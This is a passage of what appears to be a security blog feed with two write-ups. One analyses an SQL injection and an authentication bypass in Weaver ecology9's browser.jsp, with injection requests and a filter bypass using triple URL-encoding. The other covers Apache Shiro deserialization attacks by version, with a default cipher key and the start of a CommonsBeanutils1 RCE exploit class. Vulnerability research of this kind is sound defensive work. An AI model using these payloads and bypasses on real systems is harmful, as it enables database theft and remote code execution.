class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>isDis</code>参数值不为<code>1</code>的话，则进入if条件语句之中，<code>RequestDispatcher</code>的作用是将请求分配给另一个资源，后面使用的是<code>forward</code>方法，此处就是将请求转发到<code>/mobile/plugin/dialog.jsp</code>处理。那么就看看<code>/mobile/plugin/dialog.jsp</code>的内容。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230225214851650.png"></p><p>发现开头的<code>HrmUserVarify.getUser</code>，该方法部分代码如下：</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306094845347.png"></p><p>可以看出此处有个登录判断，根据未登录的情况，肯定会返回<code>null</code>到<code>dialog.jsp</code>就直接返回空了。死路一条，弃之。</p><p>回到上面，现在可以确定的是该参数是必须需要存在的，且参数值还得必须为<code>1</code>。不妨构造一个请求发送看看。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mobile/plugin/browser.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">isDis</span><span class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-browser-sqli/20230308145329059.png"></p><p>与他们放出的测试图相比，是不是就对上了。那么也就能够确定漏洞的路径就是<code>/mobile/plugin/browser.jsp</code>。</p><p>在使用BurpSuite Intruder多个不同的目标时，发现除了200的状态码，还有很多404的，这种情况我们最后再说。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230301145931253.png"></p><h2 id="0x03-补丁代码分析"><a href="#0x03-补丁代码分析" class="headerlink" title="0x03 补丁代码分析"></a>0x03 补丁代码分析</h2><p>通过前面两段内容的相互印证，可以确定本次SQL注入的漏洞补丁代码就是<code>SecurityRuleForMobileBrowser.class</code>文件的内容，完整补丁代码内容如下。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305221730843.png"></p><p>对该段补丁代码作简单分析。从第5行的第一个if条件语句开始，判断如果<code>../</code>、<code>\</code>、十六进制的<code>00</code>都不存在于URI中，则进入第6行下一个if条件语句判断，如果<code>/mobile/</code>、<code>/plugin/</code>、<code>/browser.jsp</code>都存在于URI中，那么获取<code>keyword</code>参数值；接着进入到第9行try语句，首先对<code>keyword</code>参数值进行了一次URL解码，并判断其中是否有恶意SQL注入payload <code>&#39;</code>，如果有的话，则进行拦截、拉黑IP，返回false；紧接着对<code>keyword</code>参数值进行二次URL解码，并将二次URL解码后的值与第一次URL解码的值将比较，如果不一致也会进行拦截、拉黑IP，返回false，此处判断是为了防止多层URL编码Bypass的，即第一次URL解码的结果必须是最终的的解码结果。</p><p>通过分析可以得知存在注入的参数就是<code>/mobile/plugin/browser.jsp</code>中的<code>keyword</code>参数。</p><h2 id="0x04-SQL注入分析"><a href="#0x04-SQL注入分析" class="headerlink" title="0x04 SQL注入分析"></a>0x04 SQL注入分析</h2><p>现在继续关注<code>/mobile/plugin/browser.jsp</code>中的内容。刚刚说到对<code>isDis</code>的判断，继续往下看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String f_weaver_belongto_userid=Util.null2String(request.getParameter(<span class="string">&quot;f_weaver_belongto_userid&quot;</span>));<span class="comment">//需要增加的代码</span></span><br><span class="line">String f_weaver_belongto_usertype=Util.null2String(request.getParameter(<span class="string">&quot;f_weaver_belongto_usertype&quot;</span>));<span class="comment">//需要增加的代码</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span>  <span class="operator">=</span> HrmUserVarify.getUser(request, response, f_weaver_belongto_userid, f_weaver_belongto_usertype) ;<span class="comment">//需要增加的代码</span></span><br><span class="line"></span><br><span class="line"><span class="type">BrowserAction</span> <span class="variable">braction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BrowserAction</span>(user, browserTypeId, pageNo, pageSize);</span><br></pre></td></tr></table></figure><p>跟进<code>HrmUserVarify.getUser</code>，代码如下，这里肯定会返回<code>null</code>。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306161509379.png"></p><p>起初这个地方让我感到很迷惑，误以为这个鉴权会被用到，实际并不会用到，这里返回的<code>null</code>作为<code>browser.jsp</code>中的<code>user</code>变量的值，但是在<code>browser.jsp</code>中并未对<code>user</code>做检查。如果需要达到鉴权的效果，那么正确的写法应该是增加如下代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(user == <span class="literal">null</span>)  <span class="keyword">return</span> ;</span><br></pre></td></tr></table></figure><p>如下图所示，<code>SearchSubDept.jsp</code>正是采用的这种写法。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230301151835907.png"></p><p>继续往下，设置了很多参数值，但不过大部分参数都不是必须的。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306162337947.png"></p><p>最后到<code>braction.getBrowserData()</code>方法，这个方法位于<code>classbean/weaver/mobile/webservices/common/BrowserAction.class</code>文件。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306163219969.png"></p><p>最开始有对<code>browserTypeId</code>参数值进行判断，以及很多<code>list</code>开头的方法，接着还对<code>method</code>参数值进行判断，根据不同的值执行不同的<code>list</code>开头的方法，那么注入很大可能就存在某个<code>list</code>开头的方法之中。</p><p>先简单尝试注入一下，请求如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mobile/plugin/browser.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">isDis</span>=<span class="number">1</span>&amp;browserTypeId=<span class="number">160</span>&amp;keyword=a%&#x27; union select <span class="number">1</span>,&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306222810681.png"></p><p>可以发现一些与SQL注入相关的敏感关键词（<code>&#39;</code>、<code>select</code>）均被全角化了。那尝试URL编码一下，一层URL编码的请求如下，服务器直接返回500了。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306223130961.png"></p><p>双层URL编码试试，如下图所示，服务器端依旧做了两次URL解码，然后发现<code>&#39;</code>，将其转换成全角字符了，但不过<code>select</code>关键词却没有被全角化。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306223346940.png"></p><p>继续三层URL编码，通过下图可以发现，经过三层编码后的字符串被URL解码两次后顺利到达<code>BrowserAction.getBrowserData()</code>，而在每一个<code>list</code>开头的方法中都有一次URL解码操作，那么就能确保我们的SQL注入payload顺利传递到SQL查询语句中。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306223646378.png"></p><p>下面依次对各个<code>list</code>开头的方法进行审计，最后发现当<code>browserTypeId</code>等于269时，执行的<code>listRemindType()</code>方法中存在一个有回显的SQL注入漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listRemindType</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MeetingBrowser</span>();</span><br><span class="line">        <span class="built_in">this</span>.keyword = URLDecoder.decode(<span class="built_in">this</span>.keyword, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.pageInfo.getPageNo() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.pageInfo.setPageNo(<span class="built_in">this</span>.pageInfo.getPageNo());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">RecordSet</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot; select count(0) as count from meeting_remind_type t1  where isuse=1 &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(<span class="built_in">this</span>.keyword)) &#123;</span><br><span class="line">            var2 = var2 + <span class="string">&quot; and name like &#x27;%&quot;</span> + <span class="built_in">this</span>.keyword + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var1.executeSql(var2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (var1.next()) &#123;</span><br><span class="line">            var3 = Util.getIntValue(var1.getString(<span class="string">&quot;count&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.pageInfo.setTotalCount(var3);</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="string">&quot; from  meeting_remind_type t1  &quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="string">&quot;t1.id as id,t1.name as name&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot; where isuse=1 &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(<span class="built_in">this</span>.keyword)) &#123;</span><br><span class="line">            var6 = var6 + <span class="string">&quot; and t1.name like &#x27;%&quot;</span> + <span class="built_in">this</span>.keyword + <span class="string">&quot;%&#x27; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="string">&quot;t1.id&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="string">&quot;t1.id&quot;</span>;</span><br><span class="line">        log.info(<span class="string">&quot;select &quot;</span> + var5 + var4 + <span class="string">&quot; where &quot;</span> + var6);</span><br><span class="line">        <span class="built_in">this</span>.pageInfo.setResult(<span class="built_in">this</span>.getLimitPageData(var5, var4, var6, var7, var8, <span class="number">1</span>, <span class="built_in">this</span>.pageInfo.getPageNo(), <span class="built_in">this</span>.pageInfo.getPageSize(), <span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">        var9.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里就可以直接构造注入payload了，最终注入的效果如下所示。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306225108035.png"></p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230306225238865.png"></p><h2 id="0x05-认证绕过分析"><a href="#0x05-认证绕过分析" class="headerlink" title="0x05 认证绕过分析"></a>0x05 认证绕过分析</h2><p>在上面有埋下一个坑，就是在使用BurpSuite Intruder请求多个不同的目标的<code>/mobile/plugin/browser.jsp</code>时，发现有很多返回404状态码的站。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305233525394.png"></p><p>我们需要再次对比v10.54和v10.56的补丁包。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230301153726944.png"></p><p>找到<code>SecurityRuleMobile29.class</code>这么一个补丁文件，再次对比，首先可以发现在v10.54补丁包中的 <code>SecurityRuleMobile29.class</code>文件的最后修改时间是2020年9月10日，那么如果ecology没有打过这个补丁则无需考虑绕过的情况，<code>/mobile/plugin/browser.jsp</code>路径可以被直接访问，这也就是为什么有一些站直接访问该路径不会出现404的原因。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stat -f %SB Ecology_security_20220805_v10.54/WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleMobile29.class Ecology_security_20230213_v10.56/WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleMobile29.class</span></span><br><span class="line">Sep 10 09:51:04 2020</span><br><span class="line">Dec  7 20:26:20 2022</span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-browser-sqli/20230301153906834.png"></p><p>未更新该补丁之前的<code>validate</code>方法内容如下图。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305223551904.png"></p><p>我们先从153行的else语句开始看起。毫无疑问，当请求路径中存在<code>/mobilemode/</code>或<code>/mobile/</code>或<code>/cpt/</code>其中一个，并且请求路径的结尾是<code>.jsp</code>时，顺利进入到154行if分支。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path.indexOf(<span class="string">&quot;/mobilemode/&quot;</span>) != -<span class="number">1</span> || path.indexOf(<span class="string">&quot;/mobile/&quot;</span>) != -<span class="number">1</span> || path.indexOf(<span class="string">&quot;/cpt/&quot;</span>) != -<span class="number">1</span> &amp;&amp; path.endsWith(<span class="string">&quot;.jsp&quot;</span>)) &#123;</span><br><span class="line">        List&lt;String&gt; mobileNoLoginUrlList = (List)sc.getRule().get(<span class="string">&quot;mobile-no-login-urls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mobileNoLoginUrlList != <span class="literal">null</span> &amp;&amp; !mobileNoLoginUrlList.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var7</span> <span class="operator">=</span> mobileNoLoginUrlList.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var7.hasNext()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> (String)var7.next();</span><br><span class="line">                <span class="keyword">if</span> (path.indexOf(url) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; mobileNeedLoginUrlList = (List)sc.getRule().get(<span class="string">&quot;mobile-need-login-urls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mobileNeedLoginUrlList != <span class="literal">null</span> &amp;&amp; !mobileNeedLoginUrlList.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> mobileNeedLoginUrlList.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> (String)var8.next();</span><br><span class="line">                <span class="keyword">if</span> (path.indexOf(url) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLogin</span> <span class="operator">=</span> <span class="built_in">this</span>.isLogin(req, res);</span><br><span class="line">                    <span class="keyword">if</span> (!isLogin) &#123;</span><br><span class="line">                        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[Not Login]) validateClass=weaver.security.rules.SecurityRuleMobile29  path=&quot;</span> + req.getRequestURI() + <span class="string">&quot; security validate failed!  source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，<code>mobileNoLoginUrlList</code>这个列表中的路径意味着无需登录即可直接访问，如果请求的路径在该列表中，则会返回true。</p><img src="/img/post/weaver-ecology9-browser-sqli/20230305225434361.png" style="zoom:50%;" /><p><code>mobileNeedLoginUrlList</code>列表顾名思义，当请求的路径在该列表中，则是需要登录才能访问的，否则就会返回false。而<code>/mobile/plugin/browser.jsp</code>恰巧在其之中。</p><img src="/img/post/weaver-ecology9-browser-sqli/20230305225627024.png" style="zoom:50%;" /><p>当请求的路径既不属于<code>mobileNoLoginUrlList</code>，也不属于<code>mobileNeedLoginUrlList</code>，也是会返回true的。</p><p>那么我们继续看<code>validate</code>方法中新增的补丁代码片段：</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305230609467.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (StringUtil.matches(path, <span class="string">&quot;\\s&quot;</span>) &amp;&amp; StringUtil.matches(path, <span class="string">&quot;/\\s+/&quot;</span>)) &#123;</span><br><span class="line">  sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[invalidate url]) validateClass=weaver.security.rules.SecurityRuleMobile29  path=&quot;</span> + req.getRequestURL() + <span class="string">&quot; security validate failed!  source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做了一个正则匹配，如果请求路径中存在空白字符，就会触发安全补丁的警告，并返回false。</p><p>在此之前，需要留意<code>super.path</code>方法，这个是父类<code>ParentRule</code>中的方法。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305231648026.png"></p><p><code>path</code>方法会对请求路径中出现的一些特殊字符如<code>;</code>、<code>//</code>，那么则会做正则replace。并且最后还会去除路径中出现的空白字符。最后返回<code>path.toLowerCase()</code>。</p><p>但是这里过滤的并不全，不然就不会出现补丁代码中又一遍的检查了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StringUtil.matches(path, <span class="string">&quot;\\s&quot;</span>) &amp;&amp; StringUtil.matches(path, <span class="string">&quot;/\\s+/&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以这里必定是存在绕过的，别忘了<code>path</code>方法中开始会使用<code>uriDecode</code>方法对请求路径做URL解码的哦。</p><p>最后梳理下，原始的请求路径需要先经过URL解码，解码后其中不要存在有<code>;</code>、<code>//</code>字符，然后还要经过一遍去空白字符操作，再然后就会返回最终的路径，最后的路径能到达<code>/mobile/plugin/browser.jsp</code>。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305233405114.png"></p><p>成功绕过后，就能对未打这次最新补丁的ecology进行SQL注入了。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230305235041800.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> sqli </tag>
            
            <tag> ecology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro各版本反序列化漏洞利用</title>
      <link href="/apache-shiro-deserialization-exploitation.html"/>
      <url>/apache-shiro-deserialization-exploitation.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#1-0-0-incubating-%E2%89%A4-shiro-%E2%89%A4-1-2-4">1.0.0-incubating ≤ shiro ≤ 1.2.4</a></li><li><a href="#1-2-5-%E2%89%A4-shiro-%E2%89%A4-1-3-2">1.2.5 ≤ shiro ≤ 1.3.2</a><ul><li><a href="#%E5%AE%9E%E6%B5%8B">实测</a></li></ul></li><li><a href="#1-3-2-%3C-shiro-%E2%89%A4-1-4-1">1.3.2 &lt; shiro ≤ 1.4.1</a><ul><li><a href="#%E5%AE%9E%E6%B5%8B-1">实测</a></li></ul></li><li><a href="#1-4-2-%E2%89%A4-shiro-%E2%89%A4-2-0-0">1.4.2 ≤ shiro ≤ 2.0.0+</a><ul><li><a href="#%E5%AE%9E%E6%B5%8B-2">实测</a></li></ul></li><li><a href="#%E6%AD%A3%E7%A1%AE%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F">正确修复方式</a></li></ul><h2 id="1-0-0-incubating-≤-shiro-≤-1-2-4"><a href="#1-0-0-incubating-≤-shiro-≤-1-2-4" class="headerlink" title="1.0.0-incubating ≤ shiro ≤ 1.2.4"></a>1.0.0-incubating ≤ shiro ≤ 1.2.4</h2><p>这个范围直接就是Shiro-550漏洞的影响范围，可利用CB1反序列化链配合默认密钥直接打，这是毫无疑问的。低版本Shiro中的commons-beanutils的版本较低，为1.8.3，本地构造反序列化时，注意版本要一致。</p><h2 id="1-2-5-≤-shiro-≤-1-3-2"><a href="#1-2-5-≤-shiro-≤-1-3-2" class="headerlink" title="1.2.5 ≤ shiro ≤ 1.3.2"></a>1.2.5 ≤ shiro ≤ 1.3.2</h2><p>受Shiro-550漏洞的影响，在1.2.4之后的版本中，官方通过generateNewKey方法生成一个随机密钥来进行修复。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setCipherKey(cipherService.generateNewKey().getEncoded());</span><br></pre></td></tr></table></figure><p>同时，也允许开发者在shiro.ini配置文件中自定义设置密钥，不过在默认配置中，这个字段是被注释的，无法生效。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># We need to set the cipherKey, if you want the rememberMe cookie to work after restarting or on multiple nodes.</span></span><br><span class="line"><span class="comment"># YOU MUST SET THIS TO A UNIQUE STRING</span></span><br><span class="line"><span class="comment">#securityManager.rememberMeManager.cipherKey = kPH+bIxk5D2deZiIxcaaaA==</span></span><br></pre></td></tr></table></figure><p><strong>那么，在这个版本范围内，只要开发者没有将<code>securityManager.rememberMeManager.cipherKey</code>字段取消注释，即在默认配置下，不会受到反序列化攻击的影响。</strong></p><p>当然，这个版本范围会受Shiro-721 Padding Oracle Attack漏洞的影响。</p><h3 id="实测"><a href="#实测" class="headerlink" title="实测"></a>实测</h3><p>1.2.5和1.3.2两个版本，CB1链反序列化利用失败。</p><h2 id="1-3-2-lt-shiro-≤-1-4-1"><a href="#1-3-2-lt-shiro-≤-1-4-1" class="headerlink" title="1.3.2 &lt; shiro ≤ 1.4.1"></a>1.3.2 &lt; shiro ≤ 1.4.1</h2><p>这个版本范围也受Shiro-721漏洞的影响。</p><p>在这个版本范围内的shiro.ini配置文件中，设置密钥的字段被取消注释了，由于配置文件的优先级比generateNewKey更高。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">securityManager.rememberMeManager.cipherKey</span> = kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p><strong>所以，在此版本范围内，只要攻击者得知开发者在shiro.ini配置文件中设置的密钥，依旧能够进行反序列化利用。</strong></p><p>关于CB1链的分析可见前文<a href="https://0xf4n9x.github.io/java-deserialization-cb1.html">《Java反序列化漏洞之CommonsBeanutils1链》</a>，这里直接将利用代码贴过来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.7.0 &lt;= commons-beanutils &lt;= 1.9.4</span></span><br><span class="line"><span class="comment">// JDK 8 版本通杀，已在1.8.0_65和1.8.0_361版本上测试成功，</span></span><br><span class="line"><span class="comment">// 1.7.0_04、1.7.0_80和9均测试失败</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBRCEWithoutCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sink</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title 